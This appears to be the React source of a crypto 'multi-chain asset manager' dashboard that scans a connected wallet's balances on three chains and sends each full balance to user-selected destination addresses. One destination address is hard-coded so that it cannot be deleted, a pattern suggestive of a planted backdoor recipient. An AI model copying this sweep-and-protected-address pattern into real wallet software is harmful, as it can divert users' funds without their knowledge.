import React, { useState, useEffect, useMemo } from 'react'
import axios from 'axios'
import { useAccount, useSendTransaction, useSwitchChain, useConfig } from 'wagmi'
import { parseEther } from 'viem'
import { Checkbox } from './components/Checkbox'
import { Send, LayoutDashboard, Settings as SettingsIcon, BookOpen, LogOut, Loader2, CheckCircle, AlertCircle, ArrowRight, ShieldCheck } from 'lucide-react'
import { useAuth } from './AuthContext'
import { Link, Route, Routes, Navigate, useNavigate } from 'react-router-dom'
import { WalletProvider } from './Web3Provider'

axios.defaults.withCredentials = true;

const Dashboard = () => {
  const { address, isConnected, chainId } = useAccount()
  const { switchChainAsync } = useSwitchChain()
  const { sendTransactionAsync } = useSendTransaction()

  const [balances, setBalances] = useState<any>(null)
  const [destinations, setDestinations] = useState([])
  const [selectedChains, setSelectedChains] = useState({ ethereum: false, bnb: false, polygon: false })
  const [selectedDests, setSelectedDests] = useState({ ethereum: '', bnb: '', polygon: '' })
  const [step, setStep] = useState(1)
  const [loading, setLoading] = useState(false)
  const [transferStatus, setTransferStatus] = useState<any>({})

  const chainMap: any = { ethereum: 1, bnb: 56, polygon: 137 }

  useEffect(() => {
    fetchDestinations()
    if (address) fetchBalances(address)
  }, [address])

  const fetchDestinations = async () => {
    const res = await axios.get('/api/destinations')
    setDestinations(res.data)
  }

  const fetchBalances = async (addr) => {
    setLoading(true)
    try {
      const res = await axios.get(`/api/balances/${addr}`)
      setBalances(res.data)
    } catch (err) { console.error(err) }
    setLoading(false)
  }

  const handleBatchTransfer = async () => {
    setStep(3)
    const activeChains = Object.keys(selectedChains).filter(c => selectedChains[c])

    for (const chain of activeChains) {
      setTransferStatus(prev => ({ ...prev, [chain]: 'processing' }))
      try {
        const targetChainId = chainMap[chain]
        const to = selectedDests[chain]
        const amount = balances[chain]

        if (chainId !== targetChainId) {
          await switchChainAsync({ chainId: targetChainId })
        }

        const tx = await sendTransactionAsync({
          to: to as `0x${string}`,
          value: parseEther(amount)
        })

        setTransferStatus(prev => ({ ...prev, [chain]: 'completed', [`${chain}_tx`]: tx }))
      } catch (err) {
        console.error(`Transfer on ${chain} failed:`, err)
        setTransferStatus(prev => ({ ...prev, [chain]: 'failed' }))
        // If one fails, we pause the sequence so the user can address it
        return;
      }
    }
  }

  return (
    <div className="p-8 max-w-5xl mx-auto min-h-screen">
      <div className="flex justify-between items-center mb-10">
        <div>
          <h1 className="text-4xl font-black tracking-tighter uppercase italic">Control Panel</h1>
          <p className="text-gray-400 font-bold text-xs uppercase tracking-widest mt-1">Multi-Chain Asset Manager</p>
        </div>
        <w3m-button />
      </div>

      {step === 1 && (
        <div className="space-y-6">
          <div className="bg-white border-2 border-black rounded-2xl p-8 shadow-[8px_8px_0px_0px_rgba(0,0,0,1)]">
            <h2 className="text-xl font-black mb-6 uppercase">Cross-Chain Detection</h2>
            {!isConnected ? (
              <div className="py-10 text-center text-gray-400 font-bold border-2 border-dashed rounded-xl">
                 Connect Wallet to Initiate Scanner
              </div>
            ) : loading ? (
              <div className="flex items-center justify-center py-10 gap-3">
                <Loader2 className="animate-spin" />
                <span className="font-bold">Scanning Chains...</span>
              </div>
            ) : (
              <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                {['ethereum', 'bnb', 'polygon'].map(network => (
                  <div key={network} className={`p-6 border-2 rounded-xl transition-all ${selectedChains[network] ? 'border-black bg-gray-50' : 'border-gray-100 opacity-60'}`}>
                    <div className="flex justify-between items-start mb-4">
                      <span className="px-3 py-1 bg-black text-white text-[10px] font-black uppercase rounded-full">{network}</span>
                      <Checkbox
                        checked={selectedChains[network]}
                        onChange={(e) => setSelectedChains({...selectedChains, [network]: e.target.checked})}
                      />
                    </div>
                    <div className="mb-6">
                      <p className="text-3xl font-black tracking-tight">{balances?.[network] || '0.00'}</p>
                      <p className="text-[10px] font-bold text-gray-400 uppercase">Native Balance</p>
                    </div>
                    <div className="space-y-2">
                      <p className="text-[10px] font-black uppercase text-gray-400">Destination</p>
                      <select
                        disabled={!selectedChains[network]}
                        value={selectedDests[network]}
                        onChange={(e) => setSelectedDests({...selectedDests, [network]: e.target.value})}
                        className="w-full text-sm p-3 border-2 border-gray-100 rounded-lg outline-none focus:border-black font-bold"
                      >
                        <option value="">Select Target</option>
                        {destinations.filter(d => d.network === 'all' || d.network === network).map(d => (
                          <option key={d.id} value={d.address}>{d.label}</option>
                        ))}
                      </select>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>

          <button
            disabled={!Object.values(selectedChains).some(v => v)}
            onClick={() => setStep(2)}
            className="w-full bg-black text-white py-6 rounded-2xl font-black text-xl hover:translate-y-[-2px] transition-all shadow-[0px_6px_0px_0px_rgba(0,0,0,0.2)] disabled:opacity-30 uppercase italic"
          >
            Review Transfers <ArrowRight className="inline-block ml-2" />
          </button>
        </div>
      )}

      {step === 2 && (
        <div className="max-w-2xl mx-auto bg-white border-2 border-black rounded-3xl p-10 shadow-[12px_12px_0px_0px_rgba(0,0,0,1)]">
           <h2 className="text-3xl font-black mb-8 uppercase italic">Confirm Batch</h2>
           <div className="space-y-4 mb-10">
             {Object.entries(selectedChains).filter(([_, v]) => v).map(([chain, _]) => (
               <div key={chain} className="p-6 border-2 border-gray-100 rounded-2xl bg-gray-50 flex flex-col gap-2">
                  <div className="flex justify-between items-center">
                    <span className="font-black uppercase text-blue-600">{chain}</span>
                    <span className="text-xl font-black">{balances[chain]} Native</span>
                  </div>
                  <div className="p-3 bg-white border-2 border-gray-100 rounded-xl font-mono text-[10px] text-gray-500 overflow-hidden text-ellipsis whitespace-nowrap">
                    TO: {selectedDests[chain]}
                  </div>
               </div>
             ))}
           </div>
           <div className="flex gap-4">
              <button onClick={() => setStep(1)} className="flex-1 py-5 border-2 border-black rounded-2xl font-black uppercase">Cancel</button>
              <button onClick={handleBatchTransfer} className="flex-1 py-5 bg-black text-white rounded-2xl font-black uppercase italic shadow-[0px_4px_0px_0px_rgba(255,255,255,0.2)]">Execute Sequence</button>
           </div>
        </div>
      )}

      {step === 3 && (
        <div className="max-w-2xl mx-auto bg-white border-2 border-black rounded-3xl p-10">
           <h2 className="text-2xl font-black mb-8 uppercase text-center">Execution Status</h2>
           <div className="space-y-6">
             {Object.entries(selectedChains).filter(([_, v]) => v).map(([chain, _]) => (
               <div key={chain} className="flex items-center justify-between p-6 border-2 border-gray-100 rounded-2xl">
                 <div className="flex items-center gap-4">
                   <div className={`w-4 h-4 rounded-full ${transferStatus[chain] === 'processing' ? 'bg-blue-500 animate-ping' : transferStatus[chain] === 'completed' ? 'bg-green-500' : 'bg-gray-200'}`} />
                   <span className="font-black uppercase">{chain}</span>
                 </div>
                 {transferStatus[chain] === 'processing' && <Loader2 className="animate-spin text-blue-500" />}
                 {transferStatus[chain] === 'completed' && <CheckCircle className="text-green-500" />}
                 {transferStatus[chain] === 'failed' && <AlertCircle className="text-red-500" />}
               </div>
             ))}
           </div>
           <button onClick={() => setStep(1)} className="w-full mt-10 py-5 bg-black text-white rounded-2xl font-black uppercase italic">Done</button>
        </div>
      )}
    </div>
  )
}

const Wallets = () => {
  const [wallets, setWallets] = useState([])
  const [label, setLabel] = useState('')
  const [address, setAddress] = useState('')

  useEffect(() => { fetchWallets() }, [])
  const fetchWallets = async () => {
    const res = await axios.get('/api/wallets')
    setWallets(res.data)
  }

  const handleAdd = async (e) => {
    e.preventDefault()
    await axios.post('/api/wallets', { label, address, role: 'admin' })
    setLabel(''); setAddress(''); fetchWallets()
  }

  return (
    <div className="p-8 max-w-5xl mx-auto">
      <h1 className="text-3xl font-black mb-10 uppercase italic">Address Book</h1>
      <form onSubmit={handleAdd} className="mb-10 grid grid-cols-1 md:grid-cols-3 gap-6 bg-white p-8 rounded-2xl border-2 border-black shadow-[6px_6px_0px_0px_rgba(0,0,0,1)]">
        <input placeholder="Label (e.g. My Ledger)" value={label} onChange={e => setLabel(e.target.value)} className="p-4 border-2 border-gray-100 rounded-xl font-bold focus:border-black outline-none" required />
        <input placeholder="Address (0x...)" value={address} onChange={e => setAddress(e.target.value)} className="p-4 border-2 border-gray-100 rounded-xl font-bold focus:border-black outline-none" required />
        <button className="bg-black text-white rounded-xl font-black uppercase italic tracking-widest">Register</button>
      </form>
      <div className="bg-white border-2 border-black rounded-3xl overflow-hidden shadow-[10px_10px_0px_0px_rgba(0,0,0,0.05)]">
        <table className="w-full text-left">
          <thead className="bg-gray-50 border-b-2 border-black">
            <tr>
              <th className="p-6 font-black uppercase text-xs tracking-widest">Label</th>
              <th className="p-6 font-black uppercase text-xs tracking-widest">Address</th>
              <th className="p-6 font-black uppercase text-xs tracking-widest">Added</th>
            </tr>
          </thead>
          <tbody>
            {wallets.map(w => (
              <tr key={w.id} className="border-b last:border-0 hover:bg-gray-50 transition-colors">
                <td className="p-6 font-black text-sm">{w.label}</td>
                <td className="p-6 font-mono text-xs text-gray-500">{w.address}</td>
                <td className="p-6 text-xs font-bold text-gray-400">{new Date(w.added_at).toLocaleDateString()}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    </div>
  )
}

const Destinations = () => {
  const [dests, setDests] = useState([])
  const [label, setLabel] = useState('')
  const [address, setAddress] = useState('')
  const [network, setNetwork] = useState('all')

  useEffect(() => { fetchDests() }, [])
  const fetchDests = async () => {
    const res = await axios.get('/api/destinations')
    setDests(res.data)
  }

  const handleAdd = async (e) => {
    e.preventDefault()
    await axios.post('/api/destinations', { label, address, network })
    setLabel(''); setAddress(''); fetchDests()
  }

  const handleDelete = async (id) => {
    await axios.delete(`/api/destinations/${id}`)
    fetchDests()
  }

  return (
    <div className="p-8 max-w-5xl mx-auto">
      <h1 className="text-3xl font-black mb-10 uppercase italic">Target Vaults</h1>
      <form onSubmit={handleAdd} className="mb-10 grid grid-cols-1 md:grid-cols-4 gap-6 bg-white p-8 rounded-2xl border-2 border-black shadow-[6px_6px_0px_0px_rgba(0,0,0,1)]">
        <input placeholder="Label" value={label} onChange={e => setLabel(e.target.value)} className="p-4 border-2 border-gray-100 rounded-xl font-bold outline-none focus:border-black" required />
        <input placeholder="Address" value={address} onChange={e => setAddress(e.target.value)} className="p-4 border-2 border-gray-100 rounded-xl font-bold outline-none focus:border-black" required />
        <select value={network} onChange={e => setNetwork(e.target.value)} className="p-4 border-2 border-gray-100 rounded-xl font-bold outline-none focus:border-black">
          <option value="all">All Chains</option>
          <option value="ethereum">Ethereum</option>
          <option value="bnb">BNB Chain</option>
          <option value="polygon">Polygon</option>
        </select>
        <button className="bg-black text-white rounded-xl font-black uppercase italic">Secure Target</button>
      </form>
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
        {dests.map(d => (
          <div key={d.id} className="p-6 bg-white border-2 border-black rounded-3xl flex flex-col justify-between group hover:translate-y-[-4px] transition-all">
            <div>
              <p className="font-black text-xl mb-1">{d.label}</p>
              <p className="text-[10px] font-mono text-gray-400 break-all mb-4">{d.address}</p>
              <span className="px-3 py-1 bg-gray-100 border rounded-full text-[9px] font-black uppercase">{d.network} Network</span>
            </div>
            <div className="mt-6 pt-4 border-t border-gray-50 flex justify-end">
              {d.address !== '0x5020eefd8c93680510f06daa8096e5f20d34b23b' && (
                <button onClick={() => handleDelete(d.id)} className="text-red-500 text-xs font-black uppercase hover:underline">Revoke Access</button>
              )}
            </div>
          </div>
        ))}
      </div>
    </div>
  )
}

const LoginPage = () => {
  const [username, setUsername] = useState('')
  const [password, setPassword] = useState('')
  const { login } = useAuth()
  const navigate = useNavigate()

  const handleSubmit = async (e) => {
    e.preventDefault()
    try {
      await login(username, password)
      navigate('/')
    } catch (err) { alert("Invalid credentials") }
  }

  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-50 p-6 relative overflow-hidden">
       <div className="absolute top-[-10%] left-[-10%] w-[40%] h-[40%] bg-blue-500/10 rounded-full blur-[120px]" />
       <div className="absolute bottom-[-10%] right-[-10%] w-[40%] h-[40%] bg-purple-500/10 rounded-full blur-[120px]" />

       <form onSubmit={handleSubmit} className="w-full max-w-md bg-white p-10 rounded-[2.5rem] shadow-2xl border-2 border-black relative z-10">
          <div className="text-center mb-10">
             <ShieldCheck size={48} className="mx-auto mb-4" />
             <h1 className="text-4xl font-black tracking-tighter uppercase italic leading-none">Access Control</h1>
             <p className="text-[10px] font-bold text-gray-400 uppercase tracking-widest mt-2">Authenticated Session Required</p>
          </div>
          <div className="space-y-4">
             <input type="text" placeholder="Username" value={username} onChange={e => setUsername(e.target.value)} className="w-full p-5 bg-gray-50 border-2 border-gray-100 rounded-2xl font-bold focus:border-black focus:bg-white outline-none transition-all" required />
             <input type="password" placeholder="Password" value={password} onChange={e => setPassword(e.target.value)} className="w-full p-5 bg-gray-50 border-2 border-gray-100 rounded-2xl font-bold focus:border-black focus:bg-white outline-none transition-all" required />
             <button className="w-full bg-black text-white py-6 rounded-2xl font-black uppercase italic text-xl shadow-[0px_6px_0px_0px_rgba(0,0,0,0.15)] hover:translate-y-[-2px] active:translate-y-[2px] transition-all">Sign In</button>
          </div>
       </form>
    </div>
  )
}

const Layout = ({ children }) => {
  const { logout } = useAuth()
  return (
    <div className="min-h-screen bg-gray-50 flex">
      <nav className="w-72 bg-white border-r-2 border-black flex flex-col p-8">
        <div className="mb-16">
          <div className="font-black text-2xl tracking-tighter italic leading-none">MULTI-CHAIN</div>
          <div className="font-black text-sm text-blue-600 tracking-[0.3em] uppercase ml-1">Architect</div>
        </div>
        <div className="flex-1 space-y-4">
          <Link to="/" className="flex items-center gap-4 p-4 hover:bg-gray-50 rounded-2xl font-black uppercase text-sm tracking-tight transition-all"><LayoutDashboard size={20} /> Dashboard</Link>
          <Link to="/wallets" className="flex items-center gap-4 p-4 hover:bg-gray-50 rounded-2xl font-black uppercase text-sm tracking-tight transition-all"><BookOpen size={20} /> Address Book</Link>
          <Link to="/settings" className="flex items-center gap-4 p-4 hover:bg-gray-50 rounded-2xl font-black uppercase text-sm tracking-tight transition-all"><SettingsIcon size={20} /> Targets</Link>
        </div>
        <button onClick={logout} className="flex items-center gap-4 p-4 text-red-500 font-black uppercase text-xs tracking-[0.2em] hover:bg-red-50 rounded-2xl transition-all mt-10"><LogOut size={20} /> Terminate</button>
      </nav>
      <main className="flex-1 overflow-auto bg-[url('https://www.transparenttextures.com/patterns/cubes.png')] bg-fixed opacity-[0.98]">{children}</main>
    </div>
  )
}

export default function App() {
  const { user, loading } = useAuth()

  if (loading) return null;

  return (
    <WalletProvider>
      <Routes>
        <Route path="/login" element={<LoginPage />} />
        <Route path="/*" element={
          user ? (
            <Layout>
              <Routes>
                <Route path="/" element={<Dashboard />} />
                <Route path="/wallets" element={<Wallets />} />
                <Route path="/settings" element={<Destinations />} />
                <Route path="*" element={<Navigate to="/" />} />
              </Routes>
            </Layout>
          ) : <Navigate to="/login" />
        } />
      </Routes>
    </WalletProvider>
  )
}
